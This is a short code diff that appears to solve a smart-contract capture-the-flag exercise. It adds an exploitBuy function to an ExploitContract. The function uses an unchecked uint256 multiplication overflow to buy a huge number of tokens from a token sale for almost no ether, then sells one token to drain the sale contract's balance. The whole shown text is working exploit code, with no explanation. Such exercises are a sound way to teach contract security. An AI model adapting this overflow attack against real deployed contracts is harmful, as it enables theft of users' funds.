@@ -43,4 +43,25 @@ contract ExploitContract {
 
     receive() external payable {}
     // write your exploit functions below
+    
+    function exploitBuy() external {
+        uint256 tokenPrice = 1 ether;
+        uint256 numTokens = type(uint256).max / tokenPrice + 1;
+
+        uint256 valToSend = 0;
+
+        unchecked {
+            valToSend = numTokens * tokenPrice;
+        }
+
+        require(valToSend < tokenPrice, "value is too large");
+
+        tokenSale.buy{value: valToSend}(numTokens);
+
+        require(tokenSale.balanceOf(address(this)) > 1, "");
+
+        tokenSale.sell(1);
+
+        require(address(tokenSale).balance < tokenPrice);
+    }
 }
